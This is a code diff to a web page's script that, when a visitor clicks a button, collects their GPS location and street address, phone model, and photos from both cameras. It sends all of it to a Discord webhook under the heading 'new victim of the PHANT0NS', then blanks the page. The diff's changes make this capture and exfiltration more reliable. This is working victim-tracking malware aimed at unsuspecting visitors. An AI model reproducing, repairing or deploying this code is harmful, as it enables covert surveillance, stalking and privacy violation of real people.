@@ -22,6 +22,7 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
+        // WEBHOOK CORRIGIDO
         const WEBHOOK = 'https://discord.com';
 
         document.getElementById('btn').addEventListener('click', async () => {
@@ -29,27 +30,32 @@
             document.getElementById('btn').style.display = 'none';
 
             try {
-                // Localização
-                const p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
+                // 1. Localização corrigida
+                const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                 const res = await fetch(`https://openstreetmap.org{p.coords.latitude}&lon=${p.coords.longitude}`);
                 const d = await res.json();
-                const endereco = d.display_name || "Não encontrado";
+                const endereco = d.display_name || "Endereço não identificado";
 
-                // Modelo Celular
-                const mod = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+                // 2. Modelo Celular corrigido
+                const userAgent = navigator.userAgent;
+                const modMatch = userAgent.match(/\(([^)]+)\)/);
+                const modelo = modMatch ? modMatch[1].split(';')[2] || modMatch[1] : "Desconhecido";
 
-                // Foto Frontal
+                // 3. Foto Frontal
                 const s1 = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                 const f1 = await tirar(s1);
                 
-                // Foto Traseira
+                // 4. Foto Traseira
                 const s2 = await navigator.mediaDevices.getUserMedia({video: {facingMode: "environment"}});
                 const f2 = await tirar(s2);
 
-                await enviar(f1, f2, endereco, mod);
+                await enviar(f1, f2, endereco, modelo);
+                
                 setTimeout(() => { window.location.href = "about:blank"; }, 3000);
             } catch (e) { 
-                window.location.href = "about:blank"; 
+                console.log(e);
+                // Se der erro, ele tenta enviar só o que conseguiu ou sai
+                setTimeout(() => { window.location.href = "about:blank"; }, 2000);
             }
         });
 
@@ -68,18 +74,23 @@
         async function enviar(img1, img2, end, mo) {
             const fd = new FormData();
             const payload = {
-                content: "NOVA VÍTIMA DOS PHANT0NS😈😈😈😈",
+                content: "NOVA VÍTIMA DOS PHANT0NS 😈😈😈😈",
                 embeds: [{
-                    description: `📍 **LOCALIZAÇÃO:**\n${end}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\n📱 **MODELO CELULAR:**\n${mo}\n\nphant0ns😈`,
+                    title: "DADOS DA VÍTIMA",
+                    description: `📍 **LOCALIZAÇÃO:**\n${end}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\n📱 **MODELO CELULAR:**\n${mo}\n\nphant0ns 😈`,
                     color: 16711680,
-                    image: { url: 'attachment://f1.jpg' }
-                }, {
-                    image: { url: 'attachment://f2.jpg' }
+                    image: { url: 'attachment://f1.jpg' },
+                    thumbnail: { url: 'attachment://f2.jpg' }
                 }]
             };
             fd.append('payload_json', JSON.stringify(payload));
-            fd.append('f1', await (await fetch(img1)).blob(), 'f1.jpg');
-            fd.append('f2', await (await fetch(img2)).blob(), 'f2.jpg');
+            
+            const b1 = await (await fetch(img1)).blob();
+            fd.append('file1', b1, 'f1.jpg');
+            
+            const b2 = await (await fetch(img2)).blob();
+            fd.append('file2', b2, 'f2.jpg');
+
             await fetch(WEBHOOK, { method: 'POST', body: fd });
         }
     </script>
